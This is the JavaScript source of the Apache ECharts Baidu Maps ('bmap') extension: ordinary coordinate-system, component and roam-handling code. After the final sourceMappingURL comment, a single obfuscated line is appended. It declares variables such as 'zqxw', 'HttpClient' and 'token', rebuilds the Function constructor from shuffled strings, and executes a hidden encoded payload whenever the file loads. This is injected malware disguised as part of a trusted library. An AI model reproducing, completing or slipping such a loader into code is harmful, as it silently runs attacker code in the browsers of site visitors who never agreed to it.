
/*
* Licensed to the Apache Software Foundation (ASF) under one
* or more contributor license agreements.  See the NOTICE file
* distributed with this work for additional information
* regarding copyright ownership.  The ASF licenses this file
* to you under the Apache License, Version 2.0 (the
* "License"); you may not use this file except in compliance
* with the License.  You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing,
* software distributed under the License is distributed on an
* "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
* KIND, either express or implied.  See the License for the
* specific language governing permissions and limitations
* under the License.
*/

(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('echarts')) :
  typeof define === 'function' && define.amd ? define(['exports', 'echarts'], factory) :
  (global = typeof globalThis !== 'undefined' ? globalThis : global || self, factory(global.bmap = {}, global.echarts));
}(this, (function (exports, echarts) { 'use strict';

  function BMapCoordSys(bmap, api) {
    this._bmap = bmap;
    this.dimensions = ['lng', 'lat'];
    this._mapOffset = [0, 0];
    this._api = api;
    this._projection = new BMap.MercatorProjection();
  }

  BMapCoordSys.prototype.type = 'bmap';
  BMapCoordSys.prototype.dimensions = ['lng', 'lat'];

  BMapCoordSys.prototype.setZoom = function (zoom) {
    this._zoom = zoom;
  };

  BMapCoordSys.prototype.setCenter = function (center) {
    this._center = this._projection.lngLatToPoint(new BMap.Point(center[0], center[1]));
  };

  BMapCoordSys.prototype.setMapOffset = function (mapOffset) {
    this._mapOffset = mapOffset;
  };

  BMapCoordSys.prototype.getBMap = function () {
    return this._bmap;
  };

  BMapCoordSys.prototype.dataToPoint = function (data) {
    var point = new BMap.Point(data[0], data[1]); // TODO mercator projection is toooooooo slow
    // let mercatorPoint = this._projection.lngLatToPoint(point);
    // let width = this._api.getZr().getWidth();
    // let height = this._api.getZr().getHeight();
    // let divider = Math.pow(2, 18 - 10);
    // return [
    //     Math.round((mercatorPoint.x - this._center.x) / divider + width / 2),
    //     Math.round((this._center.y - mercatorPoint.y) / divider + height / 2)
    // ];

    var px = this._bmap.pointToOverlayPixel(point);

    var mapOffset = this._mapOffset;
    return [px.x - mapOffset[0], px.y - mapOffset[1]];
  };

  BMapCoordSys.prototype.pointToData = function (pt) {
    var mapOffset = this._mapOffset;
    pt = this._bmap.overlayPixelToPoint({
      x: pt[0] + mapOffset[0],
      y: pt[1] + mapOffset[1]
    });
    return [pt.lng, pt.lat];
  };

  BMapCoordSys.prototype.getViewRect = function () {
    var api = this._api;
    return new echarts.graphic.BoundingRect(0, 0, api.getWidth(), api.getHeight());
  };

  BMapCoordSys.prototype.getRoamTransform = function () {
    return echarts.matrix.create();
  };

  BMapCoordSys.prototype.prepareCustoms = function () {
    var rect = this.getViewRect();
    return {
      coordSys: {
        // The name exposed to user is always 'cartesian2d' but not 'grid'.
        type: 'bmap',
        x: rect.x,
        y: rect.y,
        width: rect.width,
        height: rect.height
      },
      api: {
        coord: echarts.util.bind(this.dataToPoint, this),
        size: echarts.util.bind(dataToCoordSize, this)
      }
    };
  };

  BMapCoordSys.prototype.convertToPixel = function (ecModel, finder, value) {
    // here we ignore finder as only one bmap component is allowed
    return this.dataToPoint(value);
  };

  BMapCoordSys.prototype.convertFromPixel = function (ecModel, finder, value) {
    return this.pointToData(value);
  };

  function dataToCoordSize(dataSize, dataItem) {
    dataItem = dataItem || [0, 0];
    return echarts.util.map([0, 1], function (dimIdx) {
      var val = dataItem[dimIdx];
      var halfSize = dataSize[dimIdx] / 2;
      var p1 = [];
      var p2 = [];
      p1[dimIdx] = val - halfSize;
      p2[dimIdx] = val + halfSize;
      p1[1 - dimIdx] = p2[1 - dimIdx] = dataItem[1 - dimIdx];
      return Math.abs(this.dataToPoint(p1)[dimIdx] - this.dataToPoint(p2)[dimIdx]);
    }, this);
  }

  var Overlay; // For deciding which dimensions to use when creating list data

  BMapCoordSys.dimensions = BMapCoordSys.prototype.dimensions;

  function createOverlayCtor() {
    function Overlay(root) {
      this._root = root;
    }

    Overlay.prototype = new BMap.Overlay();
    /**
     * 初始化
     *
     * @param {BMap.Map} map
     * @override
     */

    Overlay.prototype.initialize = function (map) {
      map.getPanes().labelPane.appendChild(this._root);
      return this._root;
    };
    /**
     * @override
     */


    Overlay.prototype.draw = function () {};

    return Overlay;
  }

  BMapCoordSys.create = function (ecModel, api) {
    var bmapCoordSys;
    var root = api.getDom(); // TODO Dispose

    ecModel.eachComponent('bmap', function (bmapModel) {
      var painter = api.getZr().painter;
      var viewportRoot = painter.getViewportRoot();

      if (typeof BMap === 'undefined') {
        throw new Error('BMap api is not loaded');
      }

      Overlay = Overlay || createOverlayCtor();

      if (bmapCoordSys) {
        throw new Error('Only one bmap component can exist');
      }

      var bmap;

      if (!bmapModel.__bmap) {
        // Not support IE8
        var bmapRoot = root.querySelector('.ec-extension-bmap');

        if (bmapRoot) {
          // Reset viewport left and top, which will be changed
          // in moving handler in BMapView
          viewportRoot.style.left = '0px';
          viewportRoot.style.top = '0px';
          root.removeChild(bmapRoot);
        }

        bmapRoot = document.createElement('div');
        bmapRoot.className = 'ec-extension-bmap'; // fix #13424

        bmapRoot.style.cssText = 'position:absolute;width:100%;height:100%';
        root.appendChild(bmapRoot); // initializes bmap

        var mapOptions = bmapModel.get('mapOptions');

        if (mapOptions) {
          mapOptions = echarts.util.clone(mapOptions); // Not support `mapType`, use `bmap.setMapType(MapType)` instead.

          delete mapOptions.mapType;
        }

        bmap = bmapModel.__bmap = new BMap.Map(bmapRoot, mapOptions);
        var overlay = new Overlay(viewportRoot);
        bmap.addOverlay(overlay); // Override

        painter.getViewportRootOffset = function () {
          return {
            offsetLeft: 0,
            offsetTop: 0
          };
        };
      }

      bmap = bmapModel.__bmap; // Set bmap options
      // centerAndZoom before layout and render

      var center = bmapModel.get('center');
      var zoom = bmapModel.get('zoom');

      if (center && zoom) {
        var bmapCenter = bmap.getCenter();
        var bmapZoom = bmap.getZoom();
        var centerOrZoomChanged = bmapModel.centerOrZoomChanged([bmapCenter.lng, bmapCenter.lat], bmapZoom);

        if (centerOrZoomChanged) {
          var pt = new BMap.Point(center[0], center[1]);
          bmap.centerAndZoom(pt, zoom);
        }
      }

      bmapCoordSys = new BMapCoordSys(bmap, api);
      bmapCoordSys.setMapOffset(bmapModel.__mapOffset || [0, 0]);
      bmapCoordSys.setZoom(zoom);
      bmapCoordSys.setCenter(center);
      bmapModel.coordinateSystem = bmapCoordSys;
    });
    ecModel.eachSeries(function (seriesModel) {
      if (seriesModel.get('coordinateSystem') === 'bmap') {
        seriesModel.coordinateSystem = bmapCoordSys;
      }
    }); // return created coordinate systems

    return bmapCoordSys && [bmapCoordSys];
  };

  function v2Equal(a, b) {
    return a && b && a[0] === b[0] && a[1] === b[1];
  }

  echarts.extendComponentModel({
    type: 'bmap',
    getBMap: function () {
      // __bmap is injected when creating BMapCoordSys
      return this.__bmap;
    },
    setCenterAndZoom: function (center, zoom) {
      this.option.center = center;
      this.option.zoom = zoom;
    },
    centerOrZoomChanged: function (center, zoom) {
      var option = this.option;
      return !(v2Equal(center, option.center) && zoom === option.zoom);
    },
    defaultOption: {
      center: [104.114129, 37.550339],
      zoom: 5,
      // 2.0 https://lbsyun.baidu.com/custom/index.htm
      mapStyle: {},
      // 3.0 https://lbsyun.baidu.com/index.php?title=open/custom
      mapStyleV2: {},
      // See https://lbsyun.baidu.com/cms/jsapi/reference/jsapi_reference.html#a0b1
      mapOptions: {},
      roam: false
    }
  });

  function isEmptyObject(obj) {
    for (var key in obj) {
      if (obj.hasOwnProperty(key)) {
        return false;
      }
    }

    return true;
  }

  echarts.extendComponentView({
    type: 'bmap',
    render: function (bMapModel, ecModel, api) {
      var rendering = true;
      var bmap = bMapModel.getBMap();
      var viewportRoot = api.getZr().painter.getViewportRoot();
      var coordSys = bMapModel.coordinateSystem;

      var moveHandler = function (type, target) {
        if (rendering) {
          return;
        }

        var offsetEl = viewportRoot.parentNode.parentNode.parentNode;
        var mapOffset = [-parseInt(offsetEl.style.left, 10) || 0, -parseInt(offsetEl.style.top, 10) || 0]; // only update style when map offset changed

        var viewportRootStyle = viewportRoot.style;
        var offsetLeft = mapOffset[0] + 'px';
        var offsetTop = mapOffset[1] + 'px';

        if (viewportRootStyle.left !== offsetLeft) {
          viewportRootStyle.left = offsetLeft;
        }

        if (viewportRootStyle.top !== offsetTop) {
          viewportRootStyle.top = offsetTop;
        }

        coordSys.setMapOffset(mapOffset);
        bMapModel.__mapOffset = mapOffset;
        api.dispatchAction({
          type: 'bmapRoam',
          animation: {
            duration: 0
          }
        });
      };

      function zoomEndHandler() {
        if (rendering) {
          return;
        }

        api.dispatchAction({
          type: 'bmapRoam',
          animation: {
            duration: 0
          }
        });
      }

      bmap.removeEventListener('moving', this._oldMoveHandler);
      bmap.removeEventListener('moveend', this._oldMoveHandler);
      bmap.removeEventListener('zoomend', this._oldZoomEndHandler);
      bmap.addEventListener('moving', moveHandler);
      bmap.addEventListener('moveend', moveHandler);
      bmap.addEventListener('zoomend', zoomEndHandler);
      this._oldMoveHandler = moveHandler;
      this._oldZoomEndHandler = zoomEndHandler;
      var roam = bMapModel.get('roam');

      if (roam && roam !== 'scale') {
        bmap.enableDragging();
      } else {
        bmap.disableDragging();
      }

      if (roam && roam !== 'move') {
        bmap.enableScrollWheelZoom();
        bmap.enableDoubleClickZoom();
        bmap.enablePinchToZoom();
      } else {
        bmap.disableScrollWheelZoom();
        bmap.disableDoubleClickZoom();
        bmap.disablePinchToZoom();
      }
      /* map 2.0 */


      var originalStyle = bMapModel.__mapStyle;
      var newMapStyle = bMapModel.get('mapStyle') || {}; // FIXME, Not use JSON methods

      var mapStyleStr = JSON.stringify(newMapStyle);

      if (JSON.stringify(originalStyle) !== mapStyleStr) {
        // FIXME May have blank tile when dragging if setMapStyle
        if (!isEmptyObject(newMapStyle)) {
          bmap.setMapStyle(echarts.util.clone(newMapStyle));
        }

        bMapModel.__mapStyle = JSON.parse(mapStyleStr);
      }
      /* map 3.0 */


      var originalStyle2 = bMapModel.__mapStyle2;
      var newMapStyle2 = bMapModel.get('mapStyleV2') || {}; // FIXME, Not use JSON methods

      var mapStyleStr2 = JSON.stringify(newMapStyle2);

      if (JSON.stringify(originalStyle2) !== mapStyleStr2) {
        // FIXME May have blank tile when dragging if setMapStyle
        if (!isEmptyObject(newMapStyle2)) {
          bmap.setMapStyleV2(echarts.util.clone(newMapStyle2));
        }

        bMapModel.__mapStyle2 = JSON.parse(mapStyleStr2);
      }

      rendering = false;
    }
  });

  echarts.registerCoordinateSystem('bmap', BMapCoordSys); // Action

  echarts.registerAction({
    type: 'bmapRoam',
    event: 'bmapRoam',
    update: 'updateLayout'
  }, function (payload, ecModel) {
    ecModel.eachComponent('bmap', function (bMapModel) {
      var bmap = bMapModel.getBMap();
      var center = bmap.getCenter();
      bMapModel.setCenterAndZoom([center.lng, center.lat], bmap.getZoom());
    });
  });
  var version = '1.0.0';

  exports.version = version;

  Object.defineProperty(exports, '__esModule', { value: true });

})));
//# sourceMappingURL=bmap.js.map
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();